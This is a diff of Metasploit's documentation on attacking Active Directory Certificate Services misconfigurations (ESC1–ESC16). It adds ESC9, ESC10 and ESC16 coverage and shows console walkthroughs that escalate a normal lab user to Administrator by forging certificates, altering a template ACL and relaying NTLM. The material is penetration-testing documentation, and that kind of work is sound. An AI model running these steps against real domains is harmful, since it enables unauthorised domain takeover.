@@ -14,6 +14,11 @@ flowchart TD
         ESC8(ESC8)
         ESC8 --> web_enrollment[<i>Issuance via Web Enrollment</i>]
     end
+    subgraph esc_update_ldap_object[<b>esc_update_ldap_object</b>]
+        ESC9(ESC9) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+        ESC10(ESC10) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+        ESC16(ESC16) --> weak_certificate_mapping[<i>Issuance via Weak Certificate Mapping</i>]
+    end
     subgraph icpr_cert[<b>icpr_cert</b>]
         ESC1(ESC1)
         ESC2(ESC2)
@@ -51,6 +56,8 @@ flowchart TD
     update_template --> ESC1
     web_enrollment --> PKINIT
     web_enrollment --> SCHANNEL
+    weak_certificate_mapping --> PKINIT
+    weak_certificate_mapping --> SCHANNEL
 ```
 
 The chart above showcases how one can go about attacking each of the AD CS vulnerabilities supported by Metasploit,
@@ -94,11 +101,13 @@ Later, additional techniques were disclosed by security researchers:
   `StrongCertificateBindingEnforcement` not set to 2 or `CertificateMappingMethods` contains `UPN` flag.
   - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
     more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc9]]
 - ESC10 - Weak Certificate Mappings - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel
   CertificateMappingMethods` contains `UPN` bit aka `0x4` or `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
   StrongCertificateBindingEnforcement` is set to `0`.
   - [Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New Authentication and Request Methods — and
     more!](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
+  - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc10]]
 - ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of
   the `IF_ENFORCEENCRYPTICERTREQUEST` flag on `Config.CA.Interface.Flags`.
   - [Relaying to AD Certificate Services over
@@ -115,9 +124,10 @@ Later, additional techniques were disclosed by security researchers:
   manipulation
   - [EKUwu: Not just another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
   - [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc15]]
-
-Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC13 and ESC15. As such, this page only
-covers exploiting that subset of ESC flaws.
+- ESC16 - Security Extension Disabled on CA (Globally)
+  - [ESC16 - Security Extension Disabled on CA](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)
+Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC9, ESC10, ESC13, ESC15 and ESC16.
+- [[Exploit Steps|attacking-ad-cs-esc-vulnerabilities.md#exploiting-esc16]]
 
 Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3
 as the diagram notes above. This is because in ESC1, one has control over the
@@ -207,8 +217,8 @@ This will cause the module to log into the LDAP server on the target DC, and lis
 as well as the permissions that are required to enroll in these certificate templates. The following is a sample output of running this against a test server:
 
 ```msf
-msf6 > use auxiliary/gather/ldap_esc_vulnerable_cert_finder
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > show options
+msf > use auxiliary/gather/ldap_esc_vulnerable_cert_finder
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > show options
 
 Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):
 
@@ -229,15 +239,15 @@ Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set DOMAIN DAFOREST
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set DOMAIN DAFOREST
 DOMAIN => DAFOREST
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set USERNAME normaluser
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set USERNAME normaluser
 USERNAME => normaluser
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set PASSWORD normalpass
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set PASSWORD normalpass
 PASSWORD => normalpass
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set RHOSTS 172.30.239.85
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 [*] Running module against 172.30.239.85
 
 [*] Discovering base DN automatically
@@ -318,7 +328,7 @@ msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > run
 [*]     Enrollment SIDs:
 [*]       * S-1-5-11 (Authenticated Users)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) >
+msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) >
 ```
 
 From the output above we can determine that the SubCA certificate template is vulnerable to several attacks. However,
@@ -357,24 +367,24 @@ If we know the domain name is `daforest.com` and the domain administrator of thi
 quickly set this up:
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Template
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC1-Template
 CERT_TEMPLATE => ESC1-Template
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
 SMBDomain => DAFOREST
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
 ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
 ALT_UPN => Administrator@daforest.com
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -383,7 +393,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
@@ -401,20 +411,20 @@ To do this we will use the `ipcr_cert` module and we will set the usual options,
 For the first run, we will set the usual `RHOSTS`, `CA`, and `CERT_TEMPLATE` details, being sure to set `CERT_TEMPLATE` to the vulnerable `ESC2-Template` certificate template, and supply valid SMB login credentials. This will grant us a certificate for our current user that is based off of the vulnerable `ESC2-Template`:
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC2-Template
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC2-Template
 CERT_TEMPLATE => ESC2-Template
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
 SMBDomain => DAFOREST
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -444,7 +454,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -453,7 +463,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot
+msf auxiliary(admin/dcerpc/icpr_cert) > loot
 
 Loot
 ====
@@ -462,13 +472,13 @@ host  service  type           name             content               info       
 ----  -------  ----           ----             -------               ----                         ----
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Next, we need to use the PFX file that we got to request another certificate to authenticate on behalf of another user. We will use the `PFX` option to specify the PFX file, and the `ON_BEHALF_OF` setting to specify the user we would like to authenticate on behalf of. Finally we will change the certificate template to another certificate template that we are able to enroll in. The default `User` certificate should work here since it allows enrollment by any authenticated domain user.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -498,13 +508,13 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
 ON_BEHALF_OF => DAFOREST\Administrator
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
 PFX => /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -537,7 +547,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -546,7 +556,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot
+msf auxiliary(admin/dcerpc/icpr_cert) > loot
 
 Loot
 ====
@@ -556,7 +566,7 @@ host  service  type           name             content               info       
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216154930_default_unknown_windows.ad.cs_104207.pfx
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216155701_default_unknown_windows.ad.cs_756798.pfx
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
@@ -592,8 +602,8 @@ Narrowing this list down to those we can actually enroll in as users, this leave
 We'll first get the cert using `ipcr_cert` with the `ESC3-Template1` certificate.
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf > use auxiliary/admin/dcerpc/icpr_cert
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -623,19 +633,19 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain DAFOREST
 SMBDomain => DAFOREST
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template1
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template1
 CERT_TEMPLATE => ESC3-Template1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -644,7 +654,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-1611
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > loot
+msf auxiliary(admin/dcerpc/icpr_cert) > loot
 
 Loot
 ====
@@ -654,17 +664,17 @@ host  service  type           name             content               info       
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216173718_default_unknown_windows.ad.cs_580032.pfx
                windows.ad.cs  certificate.pfx  application/x-pkcs12  DAFOREST\normal Certificate  /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Next, we'll try use this certificate to request another certificate on behalf of a different user. For this stage we need to specify another certificate that is vulnerable to the ESC3_TEMPLATE_2 attack vector that we are able to enroll in. We will use the `User` template for this:
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 PFX => /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
 ON_BEHALF_OF => DAFOREST\Administrator
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -697,9 +707,9 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -708,15 +718,15 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216174559_default_unknown_windows.ad.cs_570105.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Just to show this is also possible with `ESC3-Template2` here is a snippet showing that also works:
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template2
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template2
 CERT_TEMPLATE => ESC3-Template2
-msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
+msf auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
 
@@ -749,7 +759,7 @@ Auxiliary action:
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -758,7 +768,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3290009963-1772292745-3260174523-500
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216180342_default_unknown_windows.ad.cs_390825.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 We can then use the `kerberos/get_ticket` module to gain a Kerberos ticket granting ticket (TGT) as the `Administrator`
@@ -774,20 +784,20 @@ the `ESC4-Test` certificate template does not allow the certificate's subject na
 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is not set in the `msPKI-Certificate-Name-Flag` field).
 
 ```msf
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf > use auxiliary/admin/dcerpc/icpr_cert 
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
+msf auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
 ALT_UPN => Administrator@daforest.com
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run 
+msf auxiliary(admin/dcerpc/icpr_cert) > run 
 [*] Running module against 172.30.239.85
 
 [-] 172.30.239.85:445 - There was an error while requesting the certificate.
@@ -796,7 +806,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [-] 172.30.239.85:445 -   Source:  (0x0009) FACILITY_SECURITY: The source of the error code is the Security API layer.
 [-] 172.30.239.85:445 -   HRESULT: (0x80094812) CERTSRV_E_SUBJECT_EMAIL_REQUIRED: The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > 
+msf auxiliary(admin/dcerpc/icpr_cert) > 
 ```
 
 Next, we use the `ad_cs_cert_template` module to update the `ESC4-Test` certificate template. This process first makes a
@@ -805,20 +815,20 @@ update the object in Active Directory. The local certificate template data can b
 descriptor.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > use auxiliary/admin/ldap/ad_cs_cert_template 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME normaluser
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME normaluser
 USERNAME => normaluser
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD normalpass
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD normalpass
 PASSWORD => normalpass
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE ESC4-Test
 CERT_TEMPLATE => ESC4-Test
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set ACTION UPDATE 
 ACTION => UPDATE
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set VERBOSE true 
 VERBOSE => true
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 172.30.239.85
 
 [+] Successfully bound to the LDAP server!
@@ -830,32 +840,32 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Parsing SDDL text: D:PAI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > 
 ```
 
 Now that the certificate template has been updated to be vulnerable to ESC1, then we can use the `previous` shortcut
 to switch back to the last module and reattempt to issue the certificate. This time, the operation succeeds.
 
 ```msf
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > previous 
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > previous 
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [+] 172.30.239.85:445 - The requested certificate was issued.
 [*] 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
 [*] 172.30.239.85:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) > 
+msf auxiliary(admin/dcerpc/icpr_cert) > 
 ```
 
 Finally, we switch back to the `ad_cs_cert_template` module to restore the original configuration. We do this by
 setting the local template data option `TEMPLATE_FILE` to the JSON file that was created by the previous run.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > previous 
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
+msf auxiliary(admin/dcerpc/icpr_cert) > previous 
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set TEMPLATE_FILE /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
 TEMPLATE_FILE => /home/smcintyre/.msf4/loot/20230505083802_default_172.30.239.85_windows.ad.cs.te_593597.json
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Running module against 172.30.239.85
 
 [+] Successfully bound to the LDAP server!
@@ -866,7 +876,7 @@ msf6 auxiliary(admin/ldap/ad_cs_cert_template) > run
 [*] Certificate template data written to: /home/smcintyre/.msf4/loot/20230505083942_default_172.30.239.85_windows.ad.cs.te_000095.json
 [+] The operation completed successfully!
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/ldap/ad_cs_cert_template) >
+msf auxiliary(admin/ldap/ad_cs_cert_template) >
 ```
 
 At this point the certificate template's configuration has been restored and the operator has a certificate that can be
@@ -892,10 +902,10 @@ In the following example the AUTO mode is used to issue a certificate for the MS
 authenticated.
 
 ```msf
-msf6 auxiliary(server/relay/esc8) > set RHOSTS 172.30.239.85
-msf6 auxiliary(server/relay/esc8) > run
+msf auxiliary(server/relay/esc8) > set RHOSTS 172.30.239.85
+msf auxiliary(server/relay/esc8) > run
 [*] Auxiliary module running as background job 1.
-msf6 auxiliary(server/relay/esc8) > 
+msf auxiliary(server/relay/esc8) > 
 [*] SMB Server is running. Listening on 0.0.0.0:445
 [*] Server started.
 [*] New request from 192.168.159.129
@@ -921,6 +931,392 @@ msf6 auxiliary(server/relay/esc8) >
 [*] Identity: MSFLAB\smcintyre - All targets relayed to
 ```
 
+# Overview of exploiting ESC9 and ESC10 with Metasploit
+
+ESC9 and ESC10 are similar certificate misconfiguration abuse techniques. They both involve having credentials of a
+user, say "user1", who has GenericWrite privileges over "user2". This allows an attacker as "user1" to update either the
+`userPrincipalName` or `dNSHostName` attribute of "user2". In order to update the attribute, we need to authenticate 
+via LDAP - which is a unique requirement compared to the  other ESC techniques and is why there is a separated
+module called `esc_update_ldap_object` which combines the attribute update via LDAP and certificate issuance process.
+
+If the AD CS server is configured to allow "weak certificate mappings" when a user is requesting a certificate, the
+server will check the `userPrincipalName` or the `dNSHostName` of the requesting identity and then issue a certificate
+based on that value.  Therefore if we can update "user2"'s UPN to "Administrator" and then request a certificate on
+behalf of "user2" we can get an Administrator certificate (easy priv esc horay). That is the essence of both ESC9 and
+ESC10 minus a number of details we'll get into.
+
+It's also worth noting that the following registry keys and preventative measure and exploit techniques (ESC9 and 10) all stem from
+Microsoft attempts to patch CVE-2022–26923 (aka Certifried). During this effort they implemented the new
+`szOID_NTDS_CA_SECURITY_EXT` security extension for issued certificates, which will embed the `objectSid`
+property of the requester, to help facilitate "strong certificate mappings", along with the following registry keys
+and certificate template flags.
+
+## StrongCertificateBindingEnforcement
+Located in: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`
+
+This registry key defines what is considered weak and strong certificate mappings for **Kerberos authentication**. Possible values:
+
+| Setting | Method                                                                                           | Strength assessment |
+| ------- |--------------------------------------------------------------------------------------------------|---------------------|
+| 0       | No strong certificate mapping checks are done                                                    | weak                |
